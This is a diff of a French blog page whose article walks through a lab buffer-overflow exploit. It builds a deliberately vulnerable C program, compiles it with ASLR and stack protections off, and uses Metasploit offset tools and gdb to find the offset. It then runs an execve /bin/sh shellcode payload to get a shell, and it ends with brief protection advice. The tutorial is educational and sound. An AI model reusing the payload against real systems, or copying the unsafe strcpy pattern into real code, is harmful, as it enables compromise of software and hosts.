@@ -245,7 +245,7 @@ Pour les processeurs 32 bits:" />
 
 
 
-<link rel="stylesheet" href="https://leandeep.com/main.min.97cff9b820063eed1f719963e199e8907ee6d7c657c2f77cb00a044a7f22ea5a.css">
+<link rel="stylesheet" href="https://leandeep.com/main.min.2516edd1014c71ff667bbc5abfd506af171a02538f9f15382fff1b836b3078c8.css">
 
 
 
@@ -262,8 +262,8 @@ Pour les processeurs 32 bits:" />
 <meta itemprop="name" content="Se protéger des failles buffer overflow">
 <meta itemprop="description" content="L&rsquo;idée du débordement de tampon (buffer overflow en anglais) est d&rsquo;écrire des instructions supplémentaires dans les registres dans le but de pouvoir injecter et exécuter du code malveillant.
 L&rsquo;idée de cette attaque est d&rsquo;injecter du code malveillant grâce au buffer flow, de récupérer les adresses EIP de ces instructions et d&rsquo;insérer ces adresses EIP dans une stack frame entre les registres EBP et ESP pour qu&rsquo;elles soient exécutées.
-Pour les processeurs 32 bits:"><meta itemprop="datePublished" content="2022-02-25T10:59:00&#43;00:00" />
-<meta itemprop="dateModified" content="2022-02-25T10:59:00&#43;00:00" />
+Pour les processeurs 32 bits:"><meta itemprop="datePublished" content="2022-02-25T10:59:00+00:00" />
+<meta itemprop="dateModified" content="2022-02-25T10:59:00+00:00" />
 <meta itemprop="wordCount" content="461"><meta itemprop="image" content="https://leandeep.com"/>
 <meta itemprop="keywords" content="Buffer Overflow,Security," /><meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://leandeep.com"/>
@@ -277,7 +277,7 @@ Pour les processeurs 32 bits:"/>
 
 
 
-<meta property="article:published_time" content="2022-02-25 10:59:00 &#43;0000 &#43;0000" />
+<meta property="article:published_time" content="2022-02-25 10:59:00 &#43;0000 UTC" />
 
 
 
@@ -356,29 +356,29 @@ Pour les processeurs 32 bits:"/>
 </ul>
 <p><br/>
 Démarrer un container poubelle sur un Host 32 bits. <code>--privileged</code> est indispensable pour modifier l&rsquo;ASLR et installer ensuite les outils nécessaires.</p>
-<pre><code>docker run -it --rm --privileged --pid=host ubuntu bash
+<pre tabindex="0"><code>docker run -it --rm --privileged --pid=host ubuntu bash
 apt update &amp;&amp; apt install -y vim gcc gcc-multilib build-essential gdb git python-dev-is-python2 curl ruby-full
 
-# Installation de peda pour trouver l'offset (nombre de caractères à insérer avant d'être en buffer overflow)
-git clone https://github.com/longld/peda.git ~/peda &amp;&amp; echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit
+# Installation de peda pour trouver l&#39;offset (nombre de caractères à insérer avant d&#39;être en buffer overflow)
+git clone https://github.com/longld/peda.git ~/peda &amp;&amp; echo &#34;source ~/peda/peda.py&#34; &gt;&gt; ~/.gdbinit
 
 # Installation de metasploit
 curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall
 mkdir Dev &amp;&amp; cd $_ &amp;&amp; git clone https://github.com/rapid7/metasploit-framework --depth 1
 </code></pre><p><br/>
 Désactiver l&rsquo;ASLR. ⚠ pensez à le réactiver car c&rsquo;est le host qui est modifié ici, pas le container. (Faites le test avec un nouveau container flambant neuf)</p>
-<pre><code>cat /proc/sys/kernel/randomize_va_space
+<pre tabindex="0"><code>cat /proc/sys/kernel/randomize_va_space
 echo 0 &gt; /proc/sys/kernel/randomize_va_space
 cat /proc/sys/kernel/randomize_va_space
 </code></pre><p><br/>
 Créer un fichier C avec une faille buffer overflow: <code>mkdir Dev &amp;&amp; $_ &amp;&amp; vim hello.c</code></p>
-<pre><code>#include &lt;string.h&gt;
+<pre tabindex="0"><code>#include &lt;string.h&gt;
 #include &lt;stdio.h&gt;
 
 void sayHello(char *arg) {
   char buffer[20];
   strcpy(buffer, arg);
-  printf(&quot;hello %s\n&quot;, buffer);
+  printf(&#34;hello %s\n&#34;, buffer);
 }
 
 int main(int argc, char** argv) {
@@ -387,16 +387,16 @@ int main(int argc, char** argv) {
 }
 </code></pre><p><br/>
 On compile:</p>
-<pre><code>gcc -z execstack -fno-stack-protector -m32 hello.c -o hello
+<pre tabindex="0"><code>gcc -z execstack -fno-stack-protector -m32 hello.c -o hello
 </code></pre><br/>
 <p>On exécute le binaire: <code>./hello World</code>.</p>
-<pre><code>hello World
+<pre tabindex="0"><code>hello World
 </code></pre><p>On exécute le binaire: <code>./hello Olivierrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr</code> avec un débordement du buffer</p>
-<pre><code>hello Olivierrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr
+<pre tabindex="0"><code>hello Olivierrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr
 Segmentation fault
 </code></pre><br/>
 <p>Trouver l&rsquo;offset:</p>
-<pre><code># Ouvrir un terminal et exécuter:
+<pre tabindex="0"><code># Ouvrir un terminal et exécuter:
 # Générer une string aléaire à utiliser comme paramètre du programme hello
 cd Dev/metasploit-framework/tools/exploit
 gem install rex-text
@@ -406,29 +406,28 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 # Dans un second terminal
 gdb ./hello
 gdb-peda$ run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
-
 </code></pre><p><img src="https://leandeep.com/images/buffer-overflow-offset-gdb.png" alt="image"></p>
 <p>Puis dans le premier terminal exécuter:</p>
-<pre><code>./pattern_offset.rb -q 0Ab1
+<pre tabindex="0"><code>./pattern_offset.rb -q 0Ab1
 </code></pre><p><strong>[*] Exact match at offset 32</strong></p>
 <p><br/>
 EIP contient l&rsquo;adresse des instructions à exécuter. Donc on récupère l&rsquo;ESP (la fin) de la stack frame précédente</p>
-<pre><code>run $(python -c &quot;print 'A'*32&quot;)
+<pre tabindex="0"><code>run $(python -c &#34;print &#39;A&#39;*32&#34;)
 info frame
 print $esp
 </code></pre><p><strong>&ndash;&gt; 0xffffd700</strong></p>
 <p>On se cale dessus et on exécute notre shell code.
 On transforme &lsquo;0xffffd700&rsquo; -&gt; &lsquo;\x00\xd7\xff\xff&rsquo;</p>
 <p>Pour le Shell code, rendez-vous sur  <a href="http://shell-storm.org/shellcode/files/shellcode-827.php">http://shell-storm.org/shellcode/files/shellcode-827.php</a></p>
-<pre><code>./hello $(python -c &quot;print 'A'*32  + '\x00\xd7\xff\xff' + '\x90'*40 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'&quot;)
+<pre tabindex="0"><code>./hello $(python -c &#34;print &#39;A&#39;*32  + &#39;\x00\xd7\xff\xff&#39; + &#39;\x90&#39;*40 + &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;&#34;)
 </code></pre><p>Et voilà, vous verrez apparaître un shell&hellip;</p>
 <br/>
 <h2 id="protection">Protection</h2>
 <ul>
 <li>Activer l&rsquo;ASLR (Address Space Layout Randomization)</li>
 </ul>
-<pre><code>cat /proc/sys/kernel/randomize_va_space 
-# Si 2 --&gt; c'est activé; all good
+<pre tabindex="0"><code>cat /proc/sys/kernel/randomize_va_space 
+# Si 2 --&gt; c&#39;est activé; all good
 </code></pre><br/>
 <ul>
 <li>Ecrire du code plus robuste</li>
@@ -446,7 +445,7 @@ On transforme &lsquo;0xffffd700&rsquo; -&gt; &lsquo;\x00\xd7\xff\xff&rsquo;</p>
 
             <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>461 Mots</p>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>25 Feb. 2022</p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>25 févr.. 2022</p>
         </div>
 
         
@@ -503,119 +502,6 @@ On transforme &lsquo;0xffffd700&rsquo; -&gt; &lsquo;\x00\xd7\xff\xff&rsquo;</p>
 </footer>
 
 
-<script>
-
-    class App extends React.Component {
-        constructor(options) {
-            console.log("data")
-            console.log(options.data)
-            super();
-            this.state = {
-                data: options.data,
-
-                appName: 'Search Bar (Algolia replacement under dev with React)',
-                list: undefined
-            };
-
-        }
-        searchData(e) {
-            var queryData = [];
-            if (e.target.value != '') {
-                this.state.data.forEach(function (person) {
-
-                    if (person.toLowerCase().indexOf(e.target.value) != -1) {
-                        if (queryData.length < 10) {
-                            queryData.push(person);
-                        }
-                    }
-                });
-            }
-            this.setState({ list: queryData });
-        }
-        render() {
-            return  (
-                React.createElement("div", null,  
-                    React.createElement(Header, { name: this.state.appName }),  
-                    React.createElement(SearchBar, { search: this.searchData.bind(this) }),
-                    this.state.list ?  React.createElement(SearchResult, { data: this.state.list }) : null));
-
-
-        }
-    }
-
-
-    class Header extends React.Component {
-        render() {
-            return  (
-                React.createElement("div", null,  
-                    React.createElement("h1", null, this.props.name)));
-
-
-        }
-    }
-
-
-    class SearchBar extends React.Component {
-        render() {
-            return  (
-                React.createElement("div", null,  
-                    React.createElement("input", { onChange: this.props.search, placeholder: "Search Pokemon" })));
-
-
-        }
-    }
-
-
-    class SearchResult extends React.Component {
-
-        render() {
-            return  (
-                React.createElement("div", null,  
-                    React.createElement("ul", null,
-                        this.props.data.map(function (value) {
-                            return  React.createElement(Item, { key: value, val: value });
-                        }))));
-
-
-
-
-        }
-    }
-
-
-
-    class Item extends React.Component {
-        render() {
-            return  (
-                React.createElement("li", null,
-                    this.props.val));
-
-
-        }
-    }
-
-
-    navigator.serviceWorker.addEventListener('message', event => {
-        console.log(event.data.msg, event.data.url, event.data.files);
-        ReactDOM.render(  React.createElement(App, { "data": ["Bulbasaur", "Ivysaur", "Venusaur", "Charmander", "Charmeleon", "Charizard", "Squirtle", "Wartortle", "Blastoise", "Caterpie", "Metapod", "Butterfree", "Weedle", "Kakuna", "Beedrill", "Pidgey", "Pidgeotto", "Pidgeot", "Rattata", "Raticate", "Spearow", "Fearow", "Ekans", "Arbok", "Pikachu", "Raichu", "Sandshrew", "Sandslash", "Nidoran♀", "Nidorina", "Nidoqueen", "Nidoran♂", "Nidorino", "Nidoking", "Clefairy", "Clefable", "Vulpix", "Ninetales", "Jigglypuff", "Wigglytuff", "Zubat", "Golbat", "Oddish", "Gloom", "Vileplume", "Paras", "Parasect", "Venonat", "Venomoth", "Diglett", "Dugtrio", "Meowth", "Persian", "Psyduck", "Golduck", "Mankey", "Primeape", "Growlithe", "Arcanine", "Poliwag", "Poliwhirl", "Poliwrath", "Abra", "Kadabra", "Alakazam", "Machop", "Machoke", "Machamp", "Bellsprout", "Weepinbell", "Victreebel", "Tentacool", "Tentacruel", "Geodude", "Graveler", "Golem", "Ponyta", "Rapidash", "Slowpoke", "Slowbro", "Magnemite", "Magneton", "Farfetch'd", "Doduo", "Dodrio", "Seel", "Dewgong", "Grimer", "Muk", "Shellder", "Cloyster", "Gastly", "Haunter", "Gengar", "Onix", "Drowzee", "Hypno", "Krabby", "Kingler", "Voltorb", "Electrode", "Exeggcute", "Exeggutor", "Cubone", "Marowak", "Hitmonlee", "Hitmonchan", "Lickitung", "Koffing", "Weezing", "Rhyhorn", "Rhydon", "Chansey", "Tangela", "Kangaskhan", "Horsea", "Seadra", "Goldeen", "Seaking", "Staryu", "Starmie", "Mr. Mime", "Scyther", "Jynx", "Electabuzz", "Magmar", "Pinsir", "Tauros", "Magikarp", "Gyarados", "Lapras", "Ditto", "Eevee", "Vaporeon", "Jolteon", "Flareon", "Porygon", "Omanyte", "Omastar", "Kabuto", "Kabutops", "Aerodactyl", "Snorlax", "Articuno", "Zapdos", "Moltres", "Dratini", "Dragonair", "Dragonite", "Mewtwo", "Mew"] }), document.getElementById('app'));
-    });
-    navigator.serviceWorker.register('/service-worker.js', {
-        scope: '.'
-    }).then(function (registration) {
-        console.log('The service worker has been registered ', registration);
-    });
-    
-
-    
-    setTimeout(function () {
-        console.log("unregister sws")
-        navigator.serviceWorker.getRegistrations().then(function (registrations) { for (let registration of registrations) { registration.unregister(); } });
-    }, 10000);
-
-
-
-
-</script>
             
         </div>
 
@@ -624,7 +510,7 @@ On transforme &lsquo;0xffffd700&rsquo; -&gt; &lsquo;\x00\xd7\xff\xff&rsquo;</p>
 
 
 
-<script type="text/javascript" src="https://leandeep.com/bundle.min.4c4018abe212b17439e8419b064bd828529395ff8df5349aa438112be0cc961ff0ce0b0ed9b6928981ad1ac33392249f24521da889270304f8978b15643c182c.js" integrity="sha512-TEAYq&#43;ISsXQ56EGbBkvYKFKTlf&#43;N9TSapDgRK&#43;DMlh/wzgsO2baSiYGtGsMzkiSfJFIdqIknAwT4l4sVZDwYLA=="></script>
+<script type="text/javascript" src="https://leandeep.com/bundle.min.5fb899bbe79feaa4c25d3b625cdf8714b7e904c3377458df39f9a29dc271fe25b5fedd8f8b2e2d9f1c1113688203f2d727cede28a05cf1a0a61ab76cc8a929d1.js" integrity="sha512-X7iZu&#43;ef6qTCXTtiXN&#43;HFLfpBMM3dFjfOfmincJx/iW1/t2Piy4tnxwRE2iCA/LXJ87eKKBc8aCmGrdsyKkp0Q=="></script>
 
 
 
